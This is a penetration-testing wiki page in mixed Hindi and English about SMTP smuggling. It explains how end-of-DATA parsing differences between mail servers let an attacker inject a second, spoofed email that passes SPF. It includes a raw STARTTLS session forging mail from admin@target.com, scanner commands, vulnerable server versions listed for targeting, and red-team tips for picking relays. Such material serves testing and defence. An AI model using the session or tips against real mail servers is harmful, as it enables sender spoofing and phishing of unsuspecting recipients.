# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

यह प्रकार की vulnerability [**originally discovered in this post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) में पायी गई थी जहाँ समझाया गया है कि यह संभव है कि SMTP प्रोटोकॉल को finalizing करते समय parsing के अंतर का फायदा उठाकर **इमेल के body में और इमेल्स smuggle** किये जाएँ, जिससे attacker प्रभावित डोमेन के अन्य users (जैसे admin@outlook.com) का impersonation कर सकें और SPF जैसे defenses को bypass कर सकें।

### Why

यह इसलिए संभव है क्योंकि SMTP प्रोटोकॉल में भेजे जाने वाले संदेश का **data** एक user (attacker) द्वारा नियंत्रित किया जाता है जो specially crafted data भेजकर parser के अंतर का दुरुपयोग कर सकता है और receptor में extra emails smuggle कर सकता है। मूल पोस्ट के इस illustrated example को देखें:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### How

इस vulnerability को exploit करने के लिए attacker को ऐसा data भेजना होगा जिसे **Outbound SMTP server यह समझे कि यह सिर्फ 1 email है लेकिन Inbound SMTP server यह समझे कि यह कई emails हैं**।

Researchers ने पाया कि अलग‑अलग **Inbound servers आपस में अलग characters को email message के data के end के रूप में मानते हैं** जिन्हें Outbound servers नहीं मानते।\
उदाहरण के लिए, सामान्य end of data `\r\n.\r` है। लेकिन अगर Inbound SMTP server `\n.` को भी समर्थन देता है, तो attacker अपने ईमेल में बस वह data जोड़ सकता है और नए SMTP commands दिखाने लग सकता है ताकि एक नया संदेश smuggle किया जा सके, जैसा कि पिछले चित्र में दिखाया गया है।

बेशक, यह तभी काम करेगा जब **Outbound SMTP server उस data को message के अंत के रूप में भी treat न करे**, क्योंकि उस स्थिति में वह 1 के बजाय 2 emails देखेगा, इसलिए अंततः यही desynchronization इस vulnerability में दुरुपयोग किया जा रहा है।

Potential desynchronization data:

- `\n.`
- `\n.\r`

ध्यान दें कि SPF bypass होता है क्योंकि यदि आप `user@outlook.com` के संदेश से `admin@outlook.com` का email smuggle करते हैं, तो **sender अभी भी `outlook.com` ही रहता है।**

---

## Attacker’s checklist (what conditions must hold?)

एक दूसरा email सफलतापूर्वक smuggle करने के लिए सामान्यतः आपको चाहिए होगा:

- एक outbound server A जिसके माध्यम से आप भेज सकें (अक्सर valid creds के साथ) जो non‑standard end‑of‑DATA sequence को unchanged forward करे। कई सेवाएँ ऐतिहासिक रूप से ऐसे variants forward करती थीं जैसे `\n.\r\n` या `\n.\n`।
- एक receiving server B जो उस non‑standard sequence को end‑of‑DATA के रूप में interpret करे और फिर जो कुछ भी उसके बाद आए उसे नए SMTP commands (MAIL/RCPT/DATA...) के रूप में parse करे।
- Outbound को वास्तव में `DATA` के साथ भेजना चाहिए (न कि `BDAT`)। यदि A CHUNKING/BDAT का समर्थन करता है, तो smuggling तभी काम करता है जब यह DATA पर fallback करे (उदा., B CHUNKING advertise न करे), अन्यथा length‑framed BDAT ambiguity को रोक देता है।
- PIPELINING आवश्यक नहीं है पर यह injected commands को एक single TCP write में छुपाने में मदद करता है ताकि intermediate devices resynchronize न कर सकें।

Common end‑of‑DATA variants जो टेस्ट करने योग्य हैं (receiver‑dependent):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (bare CR at end)

नोट: जो काम करता है वह है “what A forwards” ∩ “what B accepts” का intersection।

---

## Manual exploitation example (single session)

निम्न raw STARTTLS SMTP session का उपयोग करके विचार दिखाता है। पहले DATA block के बाद हम एक non‑standard terminator डालते हैं, फिर एक और SMTP dialog डालते हैं जिसे receiving server एक नए संदेश के रूप में देख सकता है।

<details>
<summary>Manual smuggling session (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tip: When testing interactively, ensure `-crlf` is used so OpenSSL preserves CRLF in what you type.

---

## Automation and scanners

- hannob/smtpsmug: ऐसी संदेश भेजें जो कई malformed end‑of‑DATA sequences के साथ समाप्त हो ताकि देखा जा सके कि receiver क्या स्वीकार करता है।
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: inbound और outbound दोनों तरफ के लिए scanner तथा एक analysis SMTP server प्रदान करता है ताकि ठीक‑ठीक देखा जा सके कौन‑सी sequences sender से बचकर निकलती हैं।
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

These tools help you map the A→B pairs where smuggling actually works.

---

## CHUNKING/BDAT vs DATA

- DATA uses a sentinel terminator `<CR><LF>.<CR><LF>`; any ambiguity in how CR/LF are normalized or dot‑stuffed leads to desync.
- CHUNKING (BDAT) frames the body with an exact byte length and therefore prevents classic smuggling. However, if the sender falls back to DATA (because the receiver doesn’t advertise CHUNKING), classic smuggling becomes possible again.

---

## Notes on affected software and fixes (for targeting)

- Postfix: 3.9 से पहले default bare LFs को tolerate करता था; 3.5.23/3.6.13/3.7.9/3.8.4 से admins `smtpd_forbid_bare_newline` को enable कर सकते हैं। वर्तमान सिफारिश है `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) या कड़ाई से RFC लागू करने के लिए इसे `reject` पर सेट करें।
- Exim: 4.97.1 (और बाद) में fix किया गया है उन variants के लिए जो DATA उपयोग होने पर mixed end‑of‑DATA sequences पर निर्भर करते हैं। पुराने 4.97/4.96 संस्करण PIPELINING/CHUNKING पर निर्भर करते हुए exploit हो सकते हैं।
- Sendmail: 8.18 में fix किया गया; पुराने 8.17.x कुछ non‑standard terminators स्वीकार करते थे।
- Various libraries/servers (e.g., aiosmtpd before 1.4.5, some vendor gateways, and specific SaaS relays) had similar issues; modern versions tend to accept DATA only with strict `<CR><LF>.<CR><LF>`.

Use the scanners above to verify current behavior; many vendors changed defaults in early 2024–2025.

---

## Tips for red team ops

- A के लिए बड़े commodity senders को प्राथमिकता दें (historically Exchange Online, shared hosters, आदि)। यदि वे अभी भी कुछ non‑standard EOM अग्रेषित करते हैं और वे victim के SPF में हैं, तो आपका smuggled MAIL FROM उनकी reputation वारिस करेगा।
- B के SMTP extensions को सूचीबद्ध करें: PIPELINING/CHUNKING के लिए `EHLO` banner; यदि CHUNKING गायब है तो BDAT‑first senders से कोशिश करने का बेहतर मौका मिलता है। malformed EOMs के साथ मिलाकर acceptance की जांच करें।
- headers पर ध्यान दें: smuggled message आमतौर पर B से शुरू होकर अलग Received chain बनाएगा। DMARC अक्सर पास हो जाएगा क्योंकि MAIL FROM A के IP स्पेस के साथ align करता है।

## **References**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
